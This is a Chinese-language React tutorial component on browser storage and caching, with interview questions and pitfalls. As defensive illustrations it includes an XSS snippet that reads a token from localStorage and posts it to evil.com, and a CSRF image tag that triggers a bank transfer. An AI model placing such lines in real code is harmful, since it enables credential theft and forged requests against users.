'use client';

import { useState, useEffect } from 'react';
import DemoContainer from '@/components/DemoContainer';

export default function StorageCacheDemo() {
  const [logs, setLogs] = useState([]);
  const [storageData, setStorageData] = useState({
    localStorage: {},
    sessionStorage: {},
    cookie: '',
    indexedDB: []
  });

  const addLog = (message, type = 'info') => {
    setLogs(prev => [...prev, {
      id: Date.now() + Math.random(),
      time: new Date().toLocaleTimeString(),
      message,
      type
    }]);
  };

  const clearLogs = () => setLogs([]);

  // ===== localStorage 演示 =====
  const testLocalStorage = () => {
    clearLogs();
    addLog('=== LocalStorage 演示 ===', 'info');

    // 存储
    localStorage.setItem('user', JSON.stringify({ name: 'Alice', id: 1 }));
    localStorage.setItem('theme', 'dark');
    addLog('✅ 存储用户信息和主题设置', 'success');

    // 读取
    const user = JSON.parse(localStorage.getItem('user'));
    const theme = localStorage.getItem('theme');
    addLog(`📖 读取: user=${user.name}, theme=${theme}`, 'sync');

    // 容量测试
    try {
      const testData = 'x'.repeat(1024 * 1024); // 1MB
      localStorage.setItem('test', testData);
      addLog('✅ 存储 1MB 数据成功', 'success');
      localStorage.removeItem('test');
    } catch (e) {
      addLog(`❌ 存储失败: ${e.message}`, 'error');
    }

    // 特点总结
    addLog('📊 特点: 5-10MB、永久保存、同步 API', 'info');
    
    updateStorageDisplay();
  };

  // ===== sessionStorage 演示 =====
  const testSessionStorage = () => {
    clearLogs();
    addLog('=== SessionStorage 演示 ===', 'info');

    // 存储临时数据
    sessionStorage.setItem('tempData', JSON.stringify({ token: 'temp123' }));
    addLog('✅ 存储临时 Token', 'success');

    // 读取
    const data = JSON.parse(sessionStorage.getItem('tempData'));
    addLog(`📖 读取: token=${data.token}`, 'sync');

    // 特点
    addLog('📊 特点: 关闭标签页即清除、同标签页共享', 'info');
    addLog('💡 用途: 表单临时数据、单页应用状态', 'sync');
    
    updateStorageDisplay();
  };

  // ===== Cookie 演示 =====
  const testCookie = () => {
    clearLogs();
    addLog('=== Cookie 演示 ===', 'info');

    // 设置 Cookie
    document.cookie = 'username=Bob; max-age=3600; path=/';
    document.cookie = 'session=abc123; max-age=3600; path=/';
    addLog('✅ 设置 Cookie (username, session)', 'success');

    // 读取
    const cookies = document.cookie;
    addLog(`📖 读取: ${cookies}`, 'sync');

    // httpOnly Cookie（无法通过 JS 读取）
    addLog('🔒 安全: httpOnly Cookie 只能服务端设置', 'info');
    addLog('💡 用途: Token、会话管理（后端设置）', 'sync');

    updateStorageDisplay();
  };

  // ===== 浏览器缓存演示 =====
  const testBrowserCache = () => {
    clearLogs();
    addLog('=== 浏览器缓存演示 ===', 'info');

    addLog('📦 HTTP 缓存类型:', 'info');
    addLog('1. 强缓存（Cache-Control）', 'sync');
    addLog('   - max-age=3600: 缓存 1 小时', 'sync');
    addLog('   - no-cache: 每次验证', 'sync');
    addLog('2. 协商缓存（ETag / Last-Modified）', 'sync');
    addLog('   - 304 Not Modified: 使用缓存', 'sync');

    // 模拟缓存配置
    const cacheConfig = {
      static: 'Cache-Control: max-age=31536000, immutable',
      api: 'Cache-Control: no-cache',
      image: 'Cache-Control: max-age=86400'
    };

    Object.entries(cacheConfig).forEach(([type, header]) => {
      addLog(`${type}: ${header}`, 'info');
    });
  };

  // ===== Cache API 演示 =====
  const testCacheAPI = async () => {
    clearLogs();
    addLog('=== Cache API 演示（PWA）===', 'info');

    if ('caches' in window) {
      try {
        const cache = await caches.open('demo-cache-v1');
        addLog('✅ 打开缓存存储', 'success');

        // 缓存资源
        await cache.addAll(['/api/data']);
        addLog('✅ 缓存 API 响应', 'success');

        // 读取缓存
        const cached = await cache.match('/api/data');
        if (cached) {
          addLog('📖 读取缓存成功', 'sync');
        }

        addLog('💡 用途: PWA 离线支持、静态资源缓存', 'info');
      } catch (e) {
        addLog(`❌ 错误: ${e.message}`, 'error');
      }
    } else {
      addLog('❌ 浏览器不支持 Cache API', 'error');
    }
  };

  // 更新存储展示
  const updateStorageDisplay = () => {
    setStorageData({
      localStorage: { ...localStorage },
      sessionStorage: { ...sessionStorage },
      cookie: document.cookie,
      indexedDB: []
    });
  };

  useEffect(() => {
    updateStorageDisplay();
  }, []);

  // 对比表数据
  const comparisonData = [
    {
      name: 'LocalStorage',
      capacity: '5-10MB',
      lifetime: '永久',
      api: '同步',
      scope: '同源',
      use: '用户设置、主题'
    },
    {
      name: 'SessionStorage',
      capacity: '5-10MB',
      lifetime: '会话',
      api: '同步',
      scope: '同标签页',
      use: '表单临时数据'
    },
    {
      name: 'Cookie',
      capacity: '4KB',
      lifetime: '可设置',
      api: '同步',
      scope: '同源+子域',
      use: 'Token、会话'
    },
    {
      name: 'IndexedDB',
      capacity: '无限制',
      lifetime: '永久',
      api: '异步',
      scope: '同源',
      use: '大量结构化数据'
    },
    {
      name: 'Cache API',
      capacity: '无限制',
      lifetime: '永久',
      api: '异步',
      scope: '同源',
      use: 'PWA 离线缓存'
    }
  ];

  return (
    <DemoContainer
      title="浏览器存储与缓存"
      description="前端必备：5 种存储方案对比"
    >
      <div className="space-y-6">
        {/* 核心概念 */}
        <div className="bg-gradient-to-r from-blue-50 to-purple-50 border-2 border-blue-300 rounded-lg p-6">
          <h3 className="text-xl font-bold text-blue-900 mb-3">💾 浏览器存储方案</h3>
          <div className="grid grid-cols-5 gap-3">
            {['LocalStorage', 'SessionStorage', 'Cookie', 'IndexedDB', 'Cache API'].map((name, idx) => (
              <div key={idx} className="bg-white p-3 rounded-lg shadow text-center">
                <div className="text-2xl mb-1">
                  {['💿', '📀', '🍪', '🗄️', '📦'][idx]}
                </div>
                <div className="text-xs font-semibold text-gray-900">{name}</div>
              </div>
            ))}
          </div>
        </div>

        {/* 测试按钮 */}
        <div className="flex gap-3 flex-wrap">
          <button onClick={testLocalStorage} className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700">
            LocalStorage
          </button>
          <button onClick={testSessionStorage} className="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700">
            SessionStorage
          </button>
          <button onClick={testCookie} className="px-4 py-2 bg-orange-600 text-white rounded-lg hover:bg-orange-700">
            Cookie
          </button>
          <button onClick={testBrowserCache} className="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700">
            HTTP 缓存
          </button>
          <button onClick={testCacheAPI} className="px-4 py-2 bg-pink-600 text-white rounded-lg hover:bg-pink-700">
            Cache API
          </button>
          <button onClick={clearLogs} className="px-4 py-2 bg-gray-500 text-white rounded-lg hover:bg-gray-600">
            清空
          </button>
        </div>

        {/* 日志 */}
        <div className="bg-gray-900 text-green-400 font-mono text-sm p-4 rounded-lg h-64 overflow-y-auto">
          {logs.length === 0 ? (
            <div className="h-full flex items-center justify-center text-gray-500">
              选择一个存储方案测试
            </div>
          ) : (
            logs.map(log => (
              <div key={log.id} className="mb-1">
                <span className="text-gray-500">[{log.time}]</span>{' '}
                <span className={
                  log.type === 'success' ? 'text-green-400' :
                  log.type === 'error' ? 'text-red-400' :
                  log.type === 'sync' ? 'text-blue-400' :
                  'text-gray-400'
                }>{log.message}</span>
              </div>
            ))
          )}
        </div>

        {/* 对比表 */}
        <div className="bg-white border-2 border-gray-300 rounded-lg p-6">
          <h3 className="text-lg font-bold text-gray-900 mb-4">📊 存储方案对比</h3>
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead className="bg-gray-100">
                <tr>
                  <th className="p-2 text-left">方案</th>
                  <th className="p-2 text-left">容量</th>
                  <th className="p-2 text-left">生命周期</th>
                  <th className="p-2 text-left">API</th>
                  <th className="p-2 text-left">作用域</th>
                  <th className="p-2 text-left">典型用途</th>
                </tr>
              </thead>
              <tbody className="divide-y text-xs">
                {comparisonData.map((item, idx) => (
                  <tr key={idx}>
                    <td className="p-2 font-semibold">{item.name}</td>
                    <td className="p-2">{item.capacity}</td>
                    <td className="p-2">{item.lifetime}</td>
                    <td className="p-2">{item.api}</td>
                    <td className="p-2">{item.scope}</td>
                    <td className="p-2">{item.use}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>

        {/* 实际代码 */}
        <div className="bg-blue-50 border-l-4 border-blue-500 p-4 rounded">
          <h4 className="font-semibold text-blue-900 mb-2">💻 实际应用代码</h4>
          <details>
            <summary className="cursor-pointer text-sm text-blue-800">点击查看</summary>
            <div className="mt-3 bg-gray-900 text-gray-100 p-4 rounded-lg overflow-x-auto">
              <pre className="text-xs">
{`// ===== 1. LocalStorage（用户设置）=====
// 保存主题
const saveTheme = (theme) => {
  localStorage.setItem('theme', theme);
};

// 读取主题
const getTheme = () => {
  return localStorage.getItem('theme') || 'light';
};

// ===== 2. SessionStorage（表单临时数据）=====
// 保存表单草稿
const saveDraft = (formData) => {
  sessionStorage.setItem('draft', JSON.stringify(formData));
};

// 恢复草稿
const restoreDraft = () => {
  const draft = sessionStorage.getItem('draft');
  return draft ? JSON.parse(draft) : null;
};

// ===== 3. Cookie（Token 管理）=====
// ❌ 前端设置（不安全）
document.cookie = 'token=xxx; max-age=3600';

// ✅ 后端设置（安全）
// Node.js / Express
res.cookie('token', 'xxx', {
  httpOnly: true,    // 防 XSS
  secure: true,      // HTTPS only
  sameSite: 'strict', // 防 CSRF
  maxAge: 3600000    // 1 小时
});

// ===== 4. IndexedDB（聊天记录）=====
import { openDB } from 'idb';

const db = await openDB('chat-db', 1, {
  upgrade(db) {
    db.createObjectStore('sessions', { keyPath: 'id' });
  }
});

// 保存会话
await db.add('sessions', {
  id: Date.now(),
  title: '新对话',
  messages: []
});

// 查询会话
const sessions = await db.getAll('sessions');

// ===== 5. Cache API（PWA 离线）=====
// Service Worker
self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open('v1').then((cache) => {
      return cache.addAll([
        '/',
        '/styles.css',
        '/script.js',
        '/offline.html'
      ]);
    })
  );
});

self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request).then((response) => {
      return response || fetch(event.request);
    })
  );
});

// ===== 6. 阶跃星辰 AI Chat 应用 =====
class ChatStorage {
  // 用户设置（LocalStorage）
  static saveSettings(settings) {
    localStorage.setItem('chatSettings', JSON.stringify(settings));
  }
  
  // 对话历史（IndexedDB）
  static async saveSession(session) {
    const db = await openDB('stepfun-chat', 1);
    await db.add('sessions', session);
  }
  
  // Token（httpOnly Cookie，后端设置）
  static async login(credentials) {
    const res = await fetch('/api/login', {
      method: 'POST',
      body: JSON.stringify(credentials),
      credentials: 'include' // 自动带上 Cookie
    });
    // 后端会自动设置 httpOnly Cookie
  }
  
  // 临时草稿（SessionStorage）
  static saveDraft(content) {
    sessionStorage.setItem('draft', content);
  }
}

// ===== 7. HTTP 缓存策略（Next.js）=====
// next.config.js
module.exports = {
  async headers() {
    return [
      {
        source: '/static/:path*',
        headers: [
          {
            key: 'Cache-Control',
            // 静态资源强缓存 1 年
            value: 'public, max-age=31536000, immutable'
          }
        ]
      },
      {
        source: '/api/:path*',
        headers: [
          {
            key: 'Cache-Control',
            // API 不缓存
            value: 'no-cache, no-store, must-revalidate'
          }
        ]
      }
    ];
  }
};`}
              </pre>
            </div>
          </details>
        </div>

        {/* 思维体系定位 */}
        <div className="bg-gradient-to-r from-indigo-50 to-purple-50 border-2 border-indigo-300 rounded-lg p-6">
          <h3 className="text-xl font-bold text-indigo-900 mb-4">🧠 思维体系定位</h3>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div className="bg-white p-4 rounded-lg shadow">
              <div className="text-sm font-semibold text-purple-900 mb-2">🌐 浏览器 API</div>
              <ul className="text-xs text-gray-700 space-y-1">
                <li>• Web Storage API</li>
                <li>• IndexedDB API</li>
                <li>• Cache API / Service Worker</li>
              </ul>
            </div>
            <div className="bg-white p-4 rounded-lg shadow">
              <div className="text-sm font-semibold text-blue-900 mb-2">🔒 安全意识</div>
              <ul className="text-xs text-gray-700 space-y-1">
                <li>• XSS 攻击防御</li>
                <li>• CSRF 防御</li>
                <li>• 敏感数据保护</li>
              </ul>
            </div>
            <div className="bg-white p-4 rounded-lg shadow">
              <div className="text-sm font-semibold text-green-900 mb-2">⚡ 性能优化</div>
              <ul className="text-xs text-gray-700 space-y-1">
                <li>• HTTP 缓存策略</li>
                <li>• CDN 加速</li>
                <li>• 离线优先</li>
              </ul>
            </div>
          </div>
        </div>

        {/* 面试高频 QA */}
        <div className="bg-gradient-to-r from-purple-50 to-pink-50 border-2 border-purple-300 rounded-lg p-6">
          <h3 className="text-xl font-bold text-purple-900 mb-4">🎤 面试高频 QA</h3>
          <div className="space-y-4">
            <details className="bg-white rounded-lg p-4 shadow">
              <summary className="font-semibold text-gray-900 cursor-pointer">
                Q1: LocalStorage 和 SessionStorage 的区别？
              </summary>
              <div className="mt-3 text-sm text-gray-800">
                <div className="bg-blue-50 border-l-4 border-blue-500 p-3 rounded">
                  <p className="font-semibold text-blue-900 mb-2">✅ 核心区别：</p>
                  <table className="w-full text-xs mt-2">
                    <thead className="bg-gray-100">
                      <tr>
                        <th className="p-2 text-left">特性</th>
                        <th className="p-2 text-left">LocalStorage</th>
                        <th className="p-2 text-left">SessionStorage</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y">
                      <tr>
                        <td className="p-2 font-semibold">生命周期</td>
                        <td className="p-2">永久（手动删除）</td>
                        <td className="p-2">关闭标签页清除</td>
                      </tr>
                      <tr>
                        <td className="p-2 font-semibold">作用域</td>
                        <td className="p-2">同源所有标签页共享</td>
                        <td className="p-2">仅当前标签页</td>
                      </tr>
                      <tr>
                        <td className="p-2 font-semibold">容量</td>
                        <td className="p-2">5-10MB</td>
                        <td className="p-2">5-10MB</td>
                      </tr>
                      <tr>
                        <td className="p-2 font-semibold">用途</td>
                        <td className="p-2">用户设置、主题、语言</td>
                        <td className="p-2">表单草稿、临时状态</td>
                      </tr>
                    </tbody>
                  </table>
                  <pre className="bg-gray-900 text-gray-100 p-2 rounded text-xs mt-2">
{`// ⚠️ 注意：复制标签页会复制 SessionStorage
// 1. Ctrl+Click 链接 → 新标签页没有 SessionStorage
// 2. 右键"复制标签页" → 新标签页会复制 SessionStorage`}
                  </pre>
                </div>
              </div>
            </details>

            <details className="bg-white rounded-lg p-4 shadow">
              <summary className="font-semibold text-gray-900 cursor-pointer">
                Q2: Token 应该存在哪里？为什么？
              </summary>
              <div className="mt-3 text-sm text-gray-800">
                <div className="bg-red-50 border-l-4 border-red-500 p-3 rounded mb-2">
                  <p className="font-semibold text-red-900">❌ 不推荐：LocalStorage / SessionStorage</p>
                  <p className="text-xs mt-1">容易被 XSS 攻击窃取</p>
                  <pre className="bg-gray-900 text-gray-100 p-2 rounded text-xs mt-2">
{`// ❌ XSS 攻击示例
// 恶意脚本可以轻易获取 Token
const token = localStorage.getItem('token');
fetch('https://evil.com/steal', {
  method: 'POST',
  body: token
});`}
                  </pre>
                </div>
                <div className="bg-green-50 border-l-4 border-green-500 p-3 rounded">
                  <p className="font-semibold text-green-900">✅ 推荐：httpOnly Cookie</p>
                  <pre className="bg-gray-900 text-gray-100 p-2 rounded text-xs mt-2">
{`// 后端设置（Node.js / Express）
res.cookie('token', 'xxx', {
  httpOnly: true,      // JS 无法访问，防 XSS
  secure: true,        // 仅 HTTPS 传输
  sameSite: 'strict',  // 防 CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000 // 7 天
});

// 前端自动携带，无需手动管理
fetch('/api/user', {
  credentials: 'include' // 自动带上 Cookie
});`}
                  </pre>
                  <p className="text-xs mt-2 text-gray-700">
                    <strong>💡 如果必须用 LocalStorage：</strong>加密存储 + 短过期时间 + 定期轮换
                  </p>
                </div>
              </div>
            </details>

            <details className="bg-white rounded-lg p-4 shadow">
              <summary className="font-semibold text-gray-900 cursor-pointer">
                Q3: LocalStorage 有哪些限制和坑？
              </summary>
              <div className="mt-3 text-sm text-gray-800">
                <div className="bg-yellow-50 border-l-4 border-yellow-500 p-3 rounded">
                  <p className="font-semibold text-yellow-900 mb-2">⚠️ 常见坑：</p>
                  <ol className="list-decimal ml-5 text-xs space-y-2">
                    <li><strong>容量限制（5-10MB）</strong>
                      <pre className="bg-gray-900 text-gray-100 p-2 rounded mt-1">
{`// 超出限制会抛出异常
try {
  localStorage.setItem('key', bigData);
} catch (e) {
  if (e.name === 'QuotaExceededError') {
    console.error('存储已满');
    // 清理旧数据或使用 IndexedDB
  }
}`}
                      </pre>
                    </li>
                    <li><strong>只能存字符串</strong>
                      <pre className="bg-gray-900 text-gray-100 p-2 rounded mt-1">
{`// ❌ 错误：对象会变成 [object Object]
localStorage.setItem('user', { name: 'Alice' });

// ✅ 正确：JSON 序列化
localStorage.setItem('user', JSON.stringify({ name: 'Alice' }));
const user = JSON.parse(localStorage.getItem('user'));`}
                      </pre>
                    </li>
                    <li><strong>同步 API，会阻塞主线程</strong>
                      <pre className="bg-gray-900 text-gray-100 p-2 rounded mt-1">
{`// 大量数据读写会卡顿
// ✅ 解决：使用 IndexedDB（异步）`}
                      </pre>
                    </li>
                    <li><strong>无跨域</strong>
                      <pre className="bg-gray-900 text-gray-100 p-2 rounded mt-1">
{`// a.com 无法访问 b.com 的 localStorage
// 即使是子域名也不行（api.a.com ≠ www.a.com）`}
                      </pre>
                    </li>
                  </ol>
                </div>
              </div>
            </details>

            <details className="bg-white rounded-lg p-4 shadow">
              <summary className="font-semibold text-gray-900 cursor-pointer">
                Q4: Cookie、LocalStorage、SessionStorage 如何选择？
              </summary>
              <div className="mt-3 text-sm text-gray-800">
                <div className="bg-cyan-50 border-l-4 border-cyan-500 p-3 rounded">
                  <p className="font-semibold text-cyan-900 mb-2">📊 选型决策树：</p>
                  <pre className="bg-gray-900 text-gray-100 p-2 rounded text-xs">
{`需要发送到服务端？
├─ 是 → Cookie
│  ├─ 敏感数据（Token）→ httpOnly Cookie
│  └─ 非敏感数据（追踪）→ 普通 Cookie
│
└─ 否 → Web Storage
   ├─ 关闭标签页清除？
   │  ├─ 是 → SessionStorage（表单草稿）
   │  └─ 否 → LocalStorage（用户设置）
   │
   ├─ 数据量大（>5MB）？
   │  └─ 是 → IndexedDB（聊天记录、离线数据）
   │
   └─ 需要离线访问？
      └─ 是 → Cache API + Service Worker（PWA）

// 实际案例：
// - Token: httpOnly Cookie
// - 用户名、头像: LocalStorage
// - 表单草稿: SessionStorage
// - 聊天历史: IndexedDB
// - 静态资源: Cache API`}
                  </pre>
                </div>
              </div>
            </details>

            <details className="bg-white rounded-lg p-4 shadow">
              <summary className="font-semibold text-gray-900 cursor-pointer">
                Q5: 如何优化静态资源加载？
              </summary>
              <div className="mt-3 text-sm text-gray-800">
                <div className="bg-purple-50 border-l-4 border-purple-500 p-3 rounded">
                  <p className="font-semibold text-purple-900 mb-2">⚡ HTTP 缓存策略：</p>
                  <pre className="bg-gray-900 text-gray-100 p-2 rounded text-xs">
{`// 1. 强缓存（不发请求）
Cache-Control: max-age=31536000, immutable

// 适用：JS/CSS/字体（文件名带 hash）
// app.abc123.js → 缓存 1 年
// 更新时：改文件名 → app.def456.js

// 2. 协商缓存（304 Not Modified）
ETag: "abc123"
Last-Modified: Mon, 01 Jan 2024 00:00:00 GMT

// 适用：图片、视频（不常变）
// 浏览器发 If-None-Match / If-Modified-Since
// 服务器返回 304（使用缓存）

// 3. Next.js 示例
// next.config.js
module.exports = {
  async headers() {
    return [
      {
        source: '/_next/static/:path*',
        headers: [
          { key: 'Cache-Control', value: 'public, max-age=31536000, immutable' }
        ]
      },
      {
        source: '/api/:path*',
        headers: [
          { key: 'Cache-Control', value: 'no-cache, no-store' }
        ]
      }
    ];
  }
};

// 4. CDN 配置
// Cloudflare / AWS CloudFront
// - 自动压缩（Gzip/Brotli）
// - 边缘缓存
// - HTTP/2 推送`}
                  </pre>
                </div>
              </div>
            </details>

            <details className="bg-white rounded-lg p-4 shadow">
              <summary className="font-semibold text-gray-900 cursor-pointer">
                Q6: IndexedDB 和 LocalStorage 的区别？
              </summary>
              <div className="mt-3 text-sm text-gray-800">
                <div className="bg-teal-50 border-l-4 border-teal-500 p-3 rounded">
                  <p className="font-semibold text-teal-900 mb-2">📦 对比：</p>
                  <table className="w-full text-xs mt-2">
                    <thead className="bg-gray-100">
                      <tr>
                        <th className="p-2 text-left">特性</th>
                        <th className="p-2 text-left">LocalStorage</th>
                        <th className="p-2 text-left">IndexedDB</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y">
                      <tr>
                        <td className="p-2 font-semibold">容量</td>
                        <td className="p-2">5-10MB</td>
                        <td className="p-2 text-green-600">无限制（取决于磁盘）</td>
                      </tr>
                      <tr>
                        <td className="p-2 font-semibold">数据类型</td>
                        <td className="p-2">字符串</td>
                        <td className="p-2 text-green-600">任意类型（对象、Blob、File）</td>
                      </tr>
                      <tr>
                        <td className="p-2 font-semibold">API</td>
                        <td className="p-2">同步</td>
                        <td className="p-2 text-green-600">异步（不阻塞）</td>
                      </tr>
                      <tr>
                        <td className="p-2 font-semibold">查询</td>
                        <td className="p-2">简单键值</td>
                        <td className="p-2 text-green-600">索引、范围查询</td>
                      </tr>
                      <tr>
                        <td className="p-2 font-semibold">事务</td>
                        <td className="p-2">❌</td>
                        <td className="p-2 text-green-600">✅</td>
                      </tr>
                      <tr>
                        <td className="p-2 font-semibold">学习成本</td>
                        <td className="p-2 text-green-600">简单</td>
                        <td className="p-2">复杂</td>
                      </tr>
                    </tbody>
                  </table>
                  <pre className="bg-gray-900 text-gray-100 p-2 rounded text-xs mt-2">
{`// IndexedDB 适用场景：
// ✅ 聊天记录（大量消息）
// ✅ 离线应用（缓存数据）
// ✅ 复杂查询（按时间范围筛选）
// ✅ 文件存储（Blob、File）

// LocalStorage 适用场景：
// ✅ 用户设置（主题、语言）
// ✅ 小量数据（<1MB）
// ✅ 简单键值存储`}
                  </pre>
                </div>
              </div>
            </details>

            <details className="bg-white rounded-lg p-4 shadow">
              <summary className="font-semibold text-gray-900 cursor-pointer">
                Q7: Service Worker 和 Cache API 如何配合？
              </summary>
              <div className="mt-3 text-sm text-gray-800">
                <div className="bg-pink-50 border-l-4 border-pink-500 p-3 rounded">
                  <p className="font-semibold text-pink-900 mb-2">🚀 PWA 离线策略：</p>
                  <pre className="bg-gray-900 text-gray-100 p-2 rounded text-xs">
{`// service-worker.js

// 1. 安装阶段：预缓存静态资源
self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open('v1').then((cache) => {
      return cache.addAll([
        '/',
        '/styles.css',
        '/script.js',
        '/offline.html'
      ]);
    })
  );
});

// 2. 激活阶段：清理旧缓存
self.addEventListener('activate', (event) => {
  event.waitUntil(
    caches.keys().then((keys) => {
      return Promise.all(
        keys.filter(key => key !== 'v1')
           .map(key => caches.delete(key))
      );
    })
  );
});

// 3. 拦截请求：缓存优先策略
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request).then((response) => {
      // 缓存命中，直接返回
      if (response) return response;
      
      // 缓存未命中，发网络请求
      return fetch(event.request).then((networkResponse) => {
        // 缓存响应（仅 GET 请求）
        if (event.request.method === 'GET') {
          caches.open('v1').then((cache) => {
            cache.put(event.request, networkResponse.clone());
          });
        }
        return networkResponse;
      });
    }).catch(() => {
      // 离线时返回后备页面
      return caches.match('/offline.html');
    })
  );
});

// 注册 Service Worker
// main.js
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/service-worker.js');
}`}
                  </pre>
                </div>
              </div>
            </details>

            <details className="bg-white rounded-lg p-4 shadow">
              <summary className="font-semibold text-gray-900 cursor-pointer">
                Q8: 面试官追问：如何实现跨标签页通信？
              </summary>
              <div className="mt-3 text-sm text-gray-800">
                <div className="bg-orange-50 border-l-4 border-orange-500 p-3 rounded">
                  <p className="font-semibold text-orange-900 mb-2">💬 跨标签页通信方案：</p>
                  <pre className="bg-gray-900 text-gray-100 p-2 rounded text-xs">
{`// 方案 1: localStorage + storage 事件（推荐）
// Tab A
localStorage.setItem('message', JSON.stringify({
  type: 'logout',
  timestamp: Date.now()
}));

// Tab B
window.addEventListener('storage', (e) => {
  if (e.key === 'message') {
    const data = JSON.parse(e.newValue);
    if (data.type === 'logout') {
      // 同步退出登录
      handleLogout();
    }
  }
});

// 方案 2: BroadcastChannel（现代浏览器）
// Tab A
const bc = new BroadcastChannel('app-channel');
bc.postMessage({ type: 'logout' });

// Tab B
const bc = new BroadcastChannel('app-channel');
bc.onmessage = (event) => {
  if (event.data.type === 'logout') {
    handleLogout();
  }
};

// 方案 3: SharedWorker（复杂场景）
// worker.js
const connections = [];
onconnect = (e) => {
  const port = e.ports[0];
  connections.push(port);
  
  port.onmessage = (event) => {
    // 广播给所有连接
    connections.forEach(p => p.postMessage(event.data));
  };
};

// 对比：
// - localStorage: 兼容性最好，但有限制（5MB）
// - BroadcastChannel: 简单高效，但兼容性一般
// - SharedWorker: 功能强大，但复杂度高

// 实际应用：
// 用 BroadcastChannel，降级到 localStorage`}
                  </pre>
                </div>
              </div>
            </details>
          </div>
        </div>

        {/* 常见陷阱 */}
        <div className="bg-gradient-to-r from-yellow-50 to-red-50 border-2 border-yellow-400 rounded-lg p-6">
          <h3 className="text-xl font-bold text-yellow-900 mb-4">⚠️ 常见陷阱与注意事项</h3>
          <div className="space-y-3">
            <div className="bg-white p-4 rounded-lg shadow border-l-4 border-red-500">
              <h4 className="font-semibold text-red-900 mb-2">❌ 陷阱 1：隐私模式下 LocalStorage 失效</h4>
              <pre className="bg-gray-900 text-gray-100 p-2 rounded text-xs">
{`// Safari 隐私模式下 quota 为 0
try {
  localStorage.setItem('test', 'value');
} catch (e) {
  console.error('存储失败，可能是隐私模式');
  // 降级方案：使用内存存储
}`}
              </pre>
            </div>

            <div className="bg-white p-4 rounded-lg shadow border-l-4 border-orange-500">
              <h4 className="font-semibold text-orange-900 mb-2">❌ 陷阱 2：LocalStorage 不是数据库</h4>
              <pre className="bg-gray-900 text-gray-100 p-2 rounded text-xs">
{`// ❌ 错误：存储大量复杂数据
localStorage.setItem('users', JSON.stringify(users)); // 10000 条

// ✅ 正确：使用 IndexedDB
const db = await openDB('myDB', 1);
await db.add('users', user);`}
              </pre>
            </div>

            <div className="bg-white p-4 rounded-lg shadow border-l-4 border-yellow-500">
              <h4 className="font-semibold text-yellow-900 mb-2">❌ 陷阱 3：Cookie 自动携带导致的问题</h4>
              <pre className="bg-gray-900 text-gray-100 p-2 rounded text-xs">
{`// ❌ 问题：CSRF 攻击
// evil.com 发起请求，浏览器自动带上 cookie
<img src="https://bank.com/transfer?to=hacker&amount=1000">

// ✅ 解决：设置 sameSite
res.cookie('token', 'xxx', {
  sameSite: 'strict', // 只在同站请求时携带
  httpOnly: true,
  secure: true
});`}
              </pre>
            </div>
          </div>
        </div>

        {/* 最佳实践 */}
        <div className="bg-gradient-to-r from-green-50 to-teal-50 border-2 border-green-300 rounded-lg p-6">
          <h3 className="text-xl font-bold text-green-900 mb-4">✅ 最佳实践清单</h3>
          <div className="space-y-3">
            <div className="bg-white p-4 rounded-lg shadow">
              <h4 className="font-semibold text-gray-900 mb-2">🔒 安全相关</h4>
              <ul className="text-xs text-gray-700 space-y-1">
                <li>• Token 使用 httpOnly Cookie，不用 LocalStorage</li>
                <li>• Cookie 设置 sameSite=strict 防 CSRF</li>
                <li>• 敏感数据加密后再存储</li>
                <li>• 定期清理过期数据</li>
              </ul>
            </div>

            <div className="bg-white p-4 rounded-lg shadow">
              <h4 className="font-semibold text-gray-900 mb-2">⚡ 性能相关</h4>
              <ul className="text-xs text-gray-700 space-y-1">
                <li>• 大数据用 IndexedDB，不用 LocalStorage</li>
                <li>• 静态资源配置长缓存（1年）+ 文件名 hash</li>
                <li>• API 响应配置协商缓存（ETag）</li>
                <li>• 使用 Service Worker 实现离线缓存</li>
              </ul>
            </div>

            <div className="bg-white p-4 rounded-lg shadow">
              <h4 className="font-semibold text-gray-900 mb-2">🛠️ 开发体验</h4>
              <ul className="text-xs text-gray-700 space-y-1">
                <li>• 封装统一的存储工具类</li>
                <li>• 添加错误处理（quota、隐私模式）</li>
                <li>• 使用 TypeScript 确保类型安全</li>
                <li>• IndexedDB 使用 idb 库简化操作</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </DemoContainer>
  );
}
